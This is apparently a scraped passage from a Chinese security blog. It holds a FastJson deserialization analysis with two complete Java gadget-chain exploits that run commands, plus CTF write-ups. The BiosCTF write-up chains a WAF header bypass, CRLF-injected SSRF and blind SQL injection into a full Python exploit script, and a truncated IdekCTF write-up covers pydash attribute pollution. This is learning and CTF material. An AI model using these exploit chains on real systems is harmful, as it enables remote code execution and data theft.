(ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)int[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)long[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)float[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)double[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)boolean[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)char[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)Object[].class, (ObjectSerializer)ObjectArrayCodec.instance); this.put((Type)Class.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)SimpleDateFormat.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)Currency.class, (ObjectSerializer)(new MiscCodec())); this.put((Type)TimeZone.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)InetAddress.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)Inet4Address.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)Inet6Address.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)InetSocketAddress.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)File.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)Appendable.class, (ObjectSerializer)AppendableSerializer.instance); this.put((Type)StringBuffer.class, (ObjectSerializer)AppendableSerializer.instance); this.put((Type)StringBuilder.class, (ObjectSerializer)AppendableSerializer.instance); this.put((Type)Charset.class, (ObjectSerializer)ToStringSerializer.instance); this.put((Type)Pattern.class, (ObjectSerializer)ToStringSerializer.instance); this.put((Type)Locale.class, (ObjectSerializer)ToStringSerializer.instance); this.put((Type)URI.class, (ObjectSerializer)ToStringSerializer.instance); this.put((Type)URL.class, (ObjectSerializer)ToStringSerializer.instance); this.put((Type)UUID.class, (ObjectSerializer)ToStringSerializer.instance); this.put((Type)AtomicBoolean.class, (ObjectSerializer)AtomicCodec.instance); this.put((Type)AtomicInteger.class, (ObjectSerializer)AtomicCodec.instance); this.put((Type)AtomicLong.class, (ObjectSerializer)AtomicCodec.instance); this.put((Type)AtomicReference.class, (ObjectSerializer)ReferenceCodec.instance); this.put((Type)AtomicIntegerArray.class, (ObjectSerializer)AtomicCodec.instance); this.put((Type)AtomicLongArray.class, (ObjectSerializer)AtomicCodec.instance); this.put((Type)WeakReference.class, (ObjectSerializer)ReferenceCodec.instance); this.put((Type)SoftReference.class, (ObjectSerializer)ReferenceCodec.instance); this.put((Type)LinkedList.class, (ObjectSerializer)CollectionCodec.instance); &#125; 这里面基本上没有我们需要的东西，唯一熟悉的就是MiscCodec(提示下我们fastjson加载任意class时就是通过调用这个的TypeUtils.loadClass)，但可惜的是他的write方法同样没有什么可利用的点，再往下去除一些不关键的调用栈，接下来默认会通过createJavaBeanSerializer来创建一个ObjectSerializer对象 它会提取类当中的BeanInfo（包括有getter方法的属性）并传入createJavaBeanSerializer继续处理 1234public final ObjectSerializer createJavaBeanSerializer(Class&lt;?&gt; clazz) &#123; SerializeBeanInfo beanInfo = TypeUtils.buildBeanInfo(clazz, (Map)null, this.propertyNamingStrategy, this.fieldBased); return (ObjectSerializer)(beanInfo.fields.length == 0 &amp;&amp; Iterable.class.isAssignableFrom(clazz) ? MiscCodec.instance : this.createJavaBeanSerializer(beanInfo));&#125; 这个方法也最终会将二次处理的beaninfo继续委托给createASMSerializer做处理，而这个方法其实就是通过ASM动态创建一个类(因为和Java自带的ASM框架长的很“相似”所以阅读这部分代码并不复杂) getter方法的生成在com.alibaba.fastjson.serializer.ASMSerializerFactory#generateWriteMethod当中 它会根据字段的类型调用不同的方法处理，这里我们随便看一个(以第一个_long为例) 通过_get方法生成读取filed的方法 这里的fieldInfo其实就是我们一开始的有get方法的field的集合 12345678910111213141516171819private void _get(MethodVisitor mw, ASMSerializerFactory.Context context, FieldInfo fieldInfo) &#123; Method method = fieldInfo.method; if (method != null) &#123; mw.visitVarInsn(25, context.var(&quot;entity&quot;)); Class&lt;?&gt; declaringClass = method.getDeclaringClass(); mw.visitMethodInsn(declaringClass.isInterface() ? 185 : 182, ASMUtils.type(declaringClass), method.getName(), ASMUtils.desc(method)); if (!method.getReturnType().equals(fieldInfo.fieldClass)) &#123; mw.visitTypeInsn(192, ASMUtils.type(fieldInfo.fieldClass)); &#125; &#125; else &#123; mw.visitVarInsn(25, context.var(&quot;entity&quot;)); Field field = fieldInfo.field; mw.visitFieldInsn(180, ASMUtils.type(fieldInfo.declaringClass), field.getName(), ASMUtils.desc(field.getType())); if (!field.getType().equals(fieldInfo.fieldClass)) &#123; mw.visitTypeInsn(192, ASMUtils.type(fieldInfo.fieldClass)); &#125; &#125; &#125; 因此能最终调用方法的get方法 这里做个验证，这里我们创建一个User类,其中只有username字段有get方法 12345678public class User &#123; public String username; public String password; public String getUsername() &#123; return username; &#125;&#125; 在asm最终生成code的bytes数据写入文件 可以看到在write方法当中password因为没有get方法所以没有调用getPassword，而username有所以调用了 组合利用链既然只能触发get方法的调用那么很容易想到通过触发TemplatesImpl的getOutputProperties方法实现加载任意字节码最终触发恶意方法调用 而触发toString方法我们也有现成的链，通过BadAttributeValueExpException触发即可 因此我们很容易写出利用链子 fastjson1Maven依赖 12345678910&lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.19.0-GA&lt;/version&gt;&lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.48&lt;/version&gt;&lt;/dependency&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import com.alibaba.fastjson.JSONArray;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;public class Test &#123; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125; public static void main(String[] args) throws Exception&#123; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(&quot;a&quot;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz); constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;open -na Calculator\\&quot;);&quot;); clazz.addConstructor(constructor); byte[][] bytes = new byte[][]&#123;clazz.toBytecode()&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, &quot;_bytecodes&quot;, bytes); setValue(templates, &quot;_name&quot;, &quot;y4tacker&quot;); setValue(templates, &quot;_tfactory&quot;, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(&quot;val&quot;); valfield.setAccessible(true); valfield.set(val, jsonArray); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr); objectOutputStream.writeObject(val); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125; fastjson21234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import javax.management.BadAttributeValueExpException;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import com.alibaba.fastjson2.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;public class Test &#123; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125; public static void main(String[] args) throws Exception&#123; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(&quot;a&quot;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz); constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;open -na Calculator\\&quot;);&quot;); clazz.addConstructor(constructor); byte[][] bytes = new byte[][]&#123;clazz.toBytecode()&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, &quot;_bytecodes&quot;, bytes); setValue(templates, &quot;_name&quot;, &quot;y4tacker&quot;); setValue(templates, &quot;_tfactory&quot;, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(&quot;val&quot;); valfield.setAccessible(true); valfield.set(val, jsonArray); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr); objectOutputStream.writeObject(val); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125; 为什么fastjson1的1.2.49以后不再能利用从1.2.49开始，我们的JSONArray以及JSONObject方法开始真正有了自己的readObject方法 在其SecureObjectInputStream类当中重写了resolveClass,在其中调用了checkAutoType方法做类的检查 如何突破呢？请看下篇文章FastJson与原生反序列化(二)","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://y4tacker.github.io/tags/Fastjson/"}]},{"title":"2023BiosCTF-VulnDrive2(很实战推荐)","slug":"year/2023/1/2023BiosCTF-VulnDrive2-很实战推荐","date":"2023-01-23T09:04:28.000Z","updated":"2024-08-04T09:01:49.689Z","comments":true,"path":"2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-很实战推荐/","link":"","permalink":"https://y4tacker.github.io/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/","excerpt":"","text":"2023BiosCTF-VulnDrive2吐槽比赛的时候后面完整利用已经串起来了，脑抽卡在了SSRF利用上，还是太死脑筋了 Docker备份：https://github.com/Y4tacker/CTFBackup/blob/main/2023/BiosCTF/vulndrive2.zip 正文环境首先简单看看docker-compose.yml，发现php环境在外网 根据networks配置可知waf与其他两个环境互通，frontend与app不互通 审计以下为了方便叙述思路，将调整讲解的顺序，其中会涉及到部分穿插 waf这个容器中运行了一个go程序 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package mainimport ( &quot;fmt&quot; &quot;log&quot; &quot;net/http&quot; &quot;net/http/httputil&quot; &quot;net/url&quot; &quot;strings&quot;)var invalid = [6]string&#123;&quot;&#x27;&quot;, &quot;\\&quot;&quot;, &quot;)&quot;, &quot;(&quot;, &quot;)&quot;,&quot;=&quot;&#125;func ProxyRequestHandler(proxy *httputil.ReverseProxy) func(http.ResponseWriter, *http.Request) &#123; return func(w http.ResponseWriter, r *http.Request) &#123; if(r.Header.Get(&quot;X-pro-hacker&quot;)!=&quot;&quot;)&#123; fmt.Fprintf(w, &quot;Hello Hacker!\\n&quot;) return &#125; if(strings.Contains(r.Header.Get(&quot;flag&quot;), &quot;gimme&quot;))&#123; fmt.Fprintf(w, &quot;No flag For you!\\n&quot;) return &#125; if(r.Header.Get(&quot;Token&quot;)!=&quot;&quot;)&#123; for _, x := range invalid &#123; if(strings.Contains(r.Header.Get(&quot;Token&quot;), x))&#123; fmt.Fprintf(w, &quot;Hello Hacker!\\n&quot;) return &#125; &#125; &#125; proxy.ServeHTTP(w, r) &#125;&#125;func main() &#123; url, err := url.Parse(&quot;http://app:5000&quot;) if err != nil &#123; fmt.Println(err) &#125; proxy := httputil.NewSingleHostReverseProxy(url) http.HandleFunc(&quot;/&quot;, ProxyRequestHandler(proxy)) http.HandleFunc(&quot;/admin&quot;, func(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintf(w, &quot;Hello World!\\n&quot;)&#125;) log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))&#125; 存在两个路由/与/admin，其中/路由将我们的请求转发到http://app:5000 同时对header中的X-pro-hacker、flag、Token三个字段做了限制 要求X-pro-hacker为空，flag不能出现gimme，Token则是不能有[6]string&#123;&quot;&#39;&quot;, &quot;\\&quot;&quot;, &quot;)&quot;, &quot;(&quot;, &quot;)&quot;,&quot;=&quot;&#125;这些字符 在python的flask项目中则要求request.headers.get(&quot;X-pro-hacker&quot;)==&quot;Pro-hacker&quot; and &quot;gimme&quot; in request.headers.get(&quot;flag&quot;)，注意一个是==一个是in 这里则需要利用go与flask解析的差异性， go当中只获取第一个header的内容， 在flask当中会把header当中的_替换为-，同时如果header双写会用,进行拼接 因此我们如果构造这样的请求，则可以绕过go端的校验 1234GET / HTTP/1.1X_pro-hacker: Pro-hackerflag: flag: gimme 同时在flask眼中以上内容最终会转换为 123GET / HTTP/1.1X-pro-hacker: Pro-hackerflag: ,gimme 接下来我们来具体看看flask部分 app首先在里面会初始化sqlite数据库，将flag保存到了users与flag两张表 1234567891011121314151617181920212223242526def init_db(): try: conn = sqlite3.connect(os.path.join(os.path.realpath(os.curdir),&#x27;users.db&#x27;)) cursor = conn.cursor() result = cursor.executescript(f&quot;&quot;&quot; CREATE TABLE IF NOT EXISTS users ( username TEXT, token TEXT ); CREATE TABLE IF NOT EXISTS flag ( flag_is_here TEXT ); Delete from users; Delete from flag; INSERT INTO users values (&#x27;user&#x27;,&#x27;some_randomtoken&#x27;), (&#x27;admi&#x27;,&#x27;some_randomtoken&#x27;), ( &#x27;admin&#x27;, &#x27;&#123;FLAG&#125;&#x27; ); INSERT INTO flag values (&#x27;&#123;FLAG&#125;&#x27;); &quot;&quot;&quot;) conn.commit() return True except: return False 程序仅有一个路由，要求header中的X-pro-hacker、flag字段为指定内容 同时根据header中的参数Token做数据库的查询操作 另外我们可以看到如果存在user参数那么会取前38位执行add_user操作 1234567891011121314151617181920212223242526def add_user(user,token): q = f&quot;INSERT INTO users values (&#x27;&#123;user&#125;&#x27;,&#x27;&#123;token&#125;&#x27;)&quot; db_query(q) return @app.route(&quot;/&quot;)def index(): while not init_db(): continue if request.headers.get(&quot;X-pro-hacker&quot;)==&quot;Pro-hacker&quot; and &quot;gimme&quot; in request.headers.get(&quot;flag&quot;): try: if request.headers.get(&quot;Token&quot;): token = request.headers.get(&quot;Token&quot;) token = token[:16] token = token.replace(&quot; &quot;,&quot;&quot;).replace(&#x27;&quot;&#x27;,&quot;&quot;) if request.form.get(&quot;user&quot;): user = request.form.get(&quot;user&quot;) user = user[:38] add_user(user,token) query = f&#x27;SELECT * FROM users WHERE token=&quot;&#123;token&#125;&quot;&#x27; res = db_query(query) res = res.fetchone() return res[1] if res and len(res[0])&gt;0 else &quot;INDEX\\n&quot; except Exception as e: print(e) return &quot;INDEX\\n&quot; 首先是request.form.get(&quot;user&quot;),这个是POST表单的参数，我们如何能成功传递呢？毕竟当前路由只支持GET请求 其实flask识别request.form是依据Header头是否是Content-Type:application/x-www-form-urlencoded来判断的，因此我们只要加上并把参数放在请求体当中即可 因此很明显我们需要通过sql注入获取到flag表中flag_is_here字段的内容，由于token在go端做了字符限制，我们考虑仅在user字段中执行注入 由于flag表中仅有一个flag_is_here字段，因此我们可以用*替代减少payload长度 由于add_user当中为insert那么我们就可以考虑插入再查询的方式，通过盲注获取数据 构造如下，发现刚好长度为36，还预留了两个长度的位置，(毕竟flag长度也不会超过1000，所以完全够用了)，通过下面的语句我们每次可以将flag的一个字符带入到user表中 之后我们通过select语句查询单字符的token，如果不存在则返回INDEX，存在则返回token内容，不断重复上述步骤即可获取到flag所有内容 1234query = f&#x27;SELECT * FROM users WHERE token=&quot;&#123;token&#125;&quot;&#x27;res = db_query(query)res = res.fetchone()return res[1] if res and len(res[0])&gt;0 else &quot;INDEX\\n&quot; frontend上面已经串起来了最后来看看frontend部分 从Dockerfile可知环境是php8.1并且在uploads路径下有个.htaccess配置文件 12345FROM php:8.1-apacheCOPY src/ /var/www/html/RUN mkdir /var/www/html/uploadsRUN chown www-data:www-data /var/www/html/uploadsCOPY .htaccess /var/www/html/uploads/ 而这个配置文件仅仅只有一行，禁止直接访问uploads路径下的文件 1Deny from all 接下来看看代码，简简单单只有几个文件 接下来所有代码都为去除前端样式部分，仅保留php代码 登录页面接收username参数并保存到session当中，之后根据sessionid生成隔离用户目录 123456789101112131415161718192021222324//login.php&lt;?phpsession_start();if (!file_exists(&#x27;uploads&#x27;)) &#123; mkdir(&#x27;uploads&#x27;);&#125;if(isset($_POST[&#x27;submit&#x27;]))&#123; if(isset($_POST[&#x27;username&#x27;]))&#123; $_SESSION[&quot;username&quot;] = $_POST[&quot;username&quot;]; $folder = &#x27;./uploads/&#x27;.session_id().&quot;/&quot;; if (!file_exists($folder)) &#123; mkdir($folder); &#125; $_SESSION[&#x27;folder&#x27;] = $folder; header(&quot;Location: /index.php&quot;); die(); &#125;else&#123; echo &quot;no username provided&quot;; &#125;&#125;?&gt; 接下来是index.php部分，这里主要有两个功能一个是根据参数new创建文件夹，同时对参数new用check_name函数做了校验 1234567891011121314151617$FOLDER = $_SESSION[&#x27;folder&#x27;];//create new folder inside uploads using get parameterif (isset($_GET[&#x27;new&#x27;])) &#123; if(check_name($_GET[&quot;new&quot;]))&#123; $newfolder = $FOLDER.$_GET[&#x27;new&#x27;]; if (!file_exists($newfolder)) &#123; mkdir($newfolder); &#125;else&#123; $error = &quot;folder already exist&quot;; &#125; &#125;else&#123; die(&#x27;not allowed&#x27;); &#125;&#125; check_name过滤了符号.与/，同时里面还调用了report函数 1234567891011121314151617181920function check_name($filename)&#123; if(gettype($filename)===&quot;string&quot;)&#123; if(preg_match(&quot;/[.\\/]/i&quot;,$filename))&#123; report(); return false; &#125;else&#123; return true; //safe &#125; &#125; else&#123; return false; &#125;&#125;function report()&#123; //report usename ini_set(&quot;from&quot;,$_SESSION[&#x27;username&#x27;]); file_get_contents(&#x27;http://localhost/report.php&#x27;);&#125; 另一个是文件上传功能，可以指定path上传文件，不过可惜也经过check_name做了校验，另一点文件名取后缀，并使用uniqid函数获取随机前缀， 因此我们便不能上传一些配置文件覆盖原来的htaccess下的配置 同时虽然对后缀没有过滤，由于本身有htaccess下的限制也无法访问到我们上传的文件 12345678910111213141516171819202122232425262728if(isset($_POST[&quot;submit&quot;]))&#123; if(isset($_FILES[&#x27;file&#x27;])&amp;&amp; isset($_POST[&#x27;path&#x27;]))&#123; if(!check_name($_POST[&quot;path&quot;]))&#123; die(&quot;not allowed&quot;); &#125; $file = $_FILES[&#x27;file&#x27;]; $fileName = $file[&#x27;name&#x27;]; $fileSize = $file[&#x27;size&#x27;]; $fileError = $file[&#x27;error&#x27;]; $fileExt = explode(&#x27;.&#x27;, $fileName); $fileActualExt = strtolower(end($fileExt)); if($fileError === 0)&#123; if($fileSize &lt; 100000)&#123; $name = uniqid(&#x27;&#x27;, true).&quot;.&quot;.$fileActualExt; $fileDestination = $FOLDER.$_POST[&#x27;path&#x27;]; upload($file[&#x27;tmp_name&#x27;], $fileDestination,$name); header(&quot;Location: index.php?uploadsuccess&quot;); &#125;else&#123; $error = &quot;Your file is too big!&quot;; &#125; &#125;else&#123; $error = &quot;There was an error uploading your file!&quot;; &#125; &#125;else&#123; $error = &quot;parameter missing&quot;; &#125;&#125; 最后是view.php，根据参数fol可以查看我们上传的文件名，同时也有check_name做路径限制 12345678910111213141516171819$FOLDER = $_SESSION[&#x27;folder&#x27;];$dirr = [&#x27;.&#x27;,&#x27;..&#x27;];if(isset($_GET[&#x27;fol&#x27;]))&#123; //echo $FOLDER.$_GET[&#x27;fol&#x27;]; if(check_name($_GET[&#x27;fol&#x27;]) &amp;&amp; is_dir($FOLDER.$_GET[&#x27;fol&#x27;]))&#123; $c = &quot;&quot;; $files = array_diff(scandir($FOLDER.$_GET[&#x27;fol&#x27;]),$dirr); foreach ($files as $f) &#123; $c.= &quot;&lt;li class=\\&quot;list-group-item\\&quot;&gt;&lt;a href=&#x27;/view.php?file=&quot;.$_GET[&#x27;fol&#x27;].&quot;/&quot;.$f.&quot;&#x27;&gt;$f&lt;/a&gt;&lt;/li&gt;&quot;; &#125; echo str_replace(&quot;CONTENT&quot;,$c,$files_template); &#125;else&#123; echo &#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;folder not found&lt;/div&gt;&#x27;; &#125;&#125; 根据参数file可以查看对应的文件内容，不过有限制只能读取后缀为txt、png与jpg后缀的文件 如果注意看可以看到这里type的写法有点小问题给了我们操作的空间 ，后面会提到 12345678910111213141516171819202122232425262728293031323334353637if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $ext = explode(&#x27;.&#x27;, $file); $type = substr(strtolower(end($ext)),0,3); $file = $FOLDER.&quot;/&quot;.$file; if($type===&quot;txt&quot;)&#123; try &#123; if(file_exists($file))&#123; chdir($FOLDER); echo file_get_contents($_GET[&#x27;file&#x27;]); &#125;else&#123; echo &#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;File not found!&lt;/div&gt;&#x27;; &#125; &#125; catch (\\Throwable $th) &#123; echo &#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;Some error Occured&lt;/div&gt;&#x27;; &#125; &#125; else if($type===&quot;png&quot; || $type===&quot;jpg&quot;)&#123; try &#123; if(file_exists($file))&#123; chdir($FOLDER); echo &quot;&lt;img src=\\&quot;data:image/$type;base64,&quot;.base64_encode(file_get_contents($_GET[&#x27;file&#x27;])).&quot;\\&quot; &gt;&quot;; &#125;else&#123; echo &#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;File not found!&lt;/div&gt;&#x27;; &#125; &#125; catch (Throwable $th) &#123; echo &#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;Some error Occured&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;Invaild type&lt;/div&gt;&#x27;; &#125;&#125; SSRF既然不能rce，那有什么办法呢？ssrf同时又能控制header 答案在report函数中 123456function report()&#123; //report usename ini_set(&quot;from&quot;,$_SESSION[&#x27;username&#x27;]); file_get_contents(&#x27;http://localhost/report.php&#x27;);&#125; 可以在网上搜索到这个https://bugs.php.net/bug.php?id=81680 从漏洞描述可以看到妥妥的CRLF注入 When we set “From” field by setting ini setting “from”, which is used for “ftp” and “http” file wrapper, it can inject an arbitrary string in the raw socket message. Since the injected string can contain CR-LF sequence(\\r\\n), this can be used to interrupt the flow of FTP stream or injecting/smuggling an outgoing HTTP request. 同时下面还给了一个简洁的例子，从这里可以看到我们注入的Header在最上方，那么岂不是想控制啥控制啥嘞 为什么不能污染HOST然而当我们简单构造好username发过去触发report后会发现什么都没发生 这里我们先本地测试下 1234567891011121314151617&lt;?php/** * Author: Y4tacker */function report($username)&#123; ini_set(&quot;from&quot;,$username); file_get_contents(&#x27;http://ip:1234/report.php&#x27;);&#125;if(isset($_POST[&#x27;name&#x27;]))&#123; report($_POST[&#x27;name&#x27;]);&#125;; 明明Host当中端口已经变了，为什么还是1234呢？比赛期间就卡在最后一步上，属于是脑抽了一直觉得是本地环境问题2333 实际上在比赛后，经过简单的php源码调试我们可以发现 事实上其实在发送数据前，php已经根据我们的url与对应ip和port建立好了连接 之后再发送完整数据包 因此不论我们如何污染Host都是在原有的tcp连接上进行的通信 那我们怎么办呢？虽然能成功CRLF注入，但如何控制HOST呢？ 成功的SSRF 尝试纵观全局所有代码，我们只能看到view.php当中存在可控制的点 还记得我们之前说这个获取$type存在问题么？ 乍一看这里逻辑本来是判断后缀后，判断文件是否存在之后再读取，看着没什么问题呀？ 而问题就在于这个type是取.后的三个字符 那么如果我们创建一个名为http:的文件夹 之后让file值等于http://xxx.xxx.xxx.txt@waf，这样看也许不明显，那如果我们看看绝对路径呢？ /var/www/html/uploads/sessionid/http://xxx.xxx.xxx.txt@waf 我们知道php通常会做路径标准化，//会被替换成/，那么这个路径 /var/www/html/uploads/sessionid/http:/xxx.xxx.xxx.txt@waf 这样也就能通过file_exists函数了 Exp因此我们结合完整攻击路径将以上步骤串联起来写出exp 123456789101112131415161718192021222324252627282930313233343536import stringimport requestsimport reurl = &quot;input url&quot;i = 1flag = &#x27;&#x27;search_strs = string.printablesess = requests.session()while True: for search_str in search_strs: payload = f&quot;user=&#123;search_str&#125;&#x27;,substr((select * from flag),&#123;i&#125;,1))--&quot; username = f&quot;Hi\\r\\nX_pro-hacker: Pro-hacker\\r\\nflag: \\r\\nflag: gimme\\r\\nToken: &#123;search_str&#125;\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nHost: waf\\r\\nContent-Length: &#123;len(payload)&#125;\\r\\n\\r\\n&#123;payload&#125;&quot; sess.post(url + &quot;/login.php&quot;, data=&#123;&#x27;username&#x27;: username, &#x27;submit&#x27;: &#x27;submit&#x27;&#125;) sess.get(url + &#x27;/index.php?new=http%3A&amp;submit=Upload&#x27;) sess.post(url + &#x27;/index.php&#x27;, files=&#123; &#x27;file&#x27;: (&#x27;1.txt@waf&#x27;, &quot;&quot;.encode()), &#x27;path&#x27;: (None, &#x27;http:&#x27;), &#x27;submit&#x27;: (None, &#x27;submit&#x27;) &#125;) file_name = re.findall(&#x27;&lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=\\&#x27;(.*?)\\&#x27;&gt;.*?&lt;/a&gt;&lt;/li&gt;&#x27;, sess.get(url + &quot;/view.php?fol=http:&quot;).text)[-1].replace(&quot;http:/&quot;, &quot;http://&quot;) find = sess.get(url + f&quot;&#123;file_name&#125;&amp;fol=/&quot;).text if &#x27;INDEX&#x27; not in find: flag += search_str i += 1 print(flag) break","categories":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/categories/CTF/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://y4tacker.github.io/tags/Python/"},{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"},{"name":"Go","slug":"Go","permalink":"https://y4tacker.github.io/tags/Go/"}]},{"title":"2023IdekCTFWriteup","slug":"year/2023/1/2023IdekCTFWriteup","date":"2023-01-16T07:37:01.000Z","updated":"2024-08-04T09:01:49.694Z","comments":true,"path":"2023/01/16/year/2023/1/2023IdekCTFWriteup/","link":"","permalink":"https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/","excerpt":"","text":"2023 IdekCTF Writeup由于对xss不是很懂所以一般都是做的非xss部分，很高兴最终被强大的队友带飞下拿到第二名 环境环境可以在我的仓库下，备份了Dockerfile，可以本地搭建自己学习 https://github.com/Y4tacker/CTFBackup/tree/main/2023/IdekCTF Task Manager一个python写的好看的TODO LIST 那么我们具体来看看如何实现，这里重点看，通过json传入task与status两个参数，不同参数条件进入不同分支，通过tasks对象实现了基本的功能 12345678910111213141516171819202122@app.route(&quot;/api/manage_tasks&quot;, methods=[&quot;POST&quot;])def manage_tasks(): task, status = request.json.get(&#x27;task&#x27;), request.json.get(&#x27;status&#x27;) try: if not task or type(task) != str: return &#123;&quot;message&quot;: &quot;You must provide a task name as a string!&quot;&#125;, 400 if len(task) &gt; 150: return &#123;&quot;message&quot;: &quot;Tasks may not be over 150 characters long!&quot;&#125;, 400 if status and len(status) &gt; 50: return &#123;&quot;message&quot;: &quot;Statuses may not be over 50 characters long!&quot;&#125;, 400 if not status: tasks.complete(task) return &#123;&quot;message&quot;: &quot;Task marked complete!&quot;&#125;, 200 if type(status) != str: return &#123;&quot;message&quot;: &quot;Your status must be a string!&quot;&#125;, 400 if tasks.set(task, status): return &#123;&quot;message&quot;: &quot;Task updated!&quot;&#125;, 200 return &#123;&quot;message&quot;: &quot;Invalid task name!&quot;&#125;, 400 except Exception as e: # e. print(e) return &#123;&quot;message&quot;: str(e)&#125;, 200 那这个tasks对象又是个啥呢？如下2333，很明显给你提示了protected里面存在一些骚东西，看着是很像SSTI 123456789101112131415161718192021222324252627import pydashclass TaskManager: protected = [&quot;set&quot;, &quot;get&quot;, &quot;get_all&quot;, &quot;__init__&quot;, &quot;complete&quot;] def __init__(self): self.set(&quot;capture the flag&quot;, &quot;incomplete&quot;) def set(self, task, status): if task in self.protected: return pydash.set_(self, task, status) return True def complete(self, task): if task in self.protected: return pydash.set_(self, task, False) return True def get(self, task): if hasattr(self, task): return &#123;task: getattr(self, task)&#125; return &#123;&#125; def get_all(self): return self.__dict__ 同时我们再看看这个set_方法，看doc它支持一些链式调用 但是也不是无敌的不像我们传统SSTI那样，它只能操作一些属性，而不能调用方法，同时他的操作对象是这个TaskManager类，同时由于代码限制我们只能为其赋值为string类型，这种思想就有点类似js当中原型链污染的感觉了 同时我们再回到app.py，如果app.env值是yojo，则会向全局模板函数中增加一个eval，通过add_template_global以后我们就能在模板里使用&#123;&#123;eval(payload)&#125;&#125;函数触发 1234@app.before_first_requestdef init(): if app.env == &quot;yojo&quot;: app.add_template_global(eval) 那么现在重点就是如何通过TaskManager的实例对象获取到我们flask的app对象 有了这个一方面我们可以设置env，另一方面我们还可以控制before_first_request(毕竟这个只会在第一次加载时运行) 最终在python的debugger下通过点点点最终找到了这个app对象 其中_got_first_request可以控制@app.before_first_request的运行 非预期读文件看看Dockerfile里面 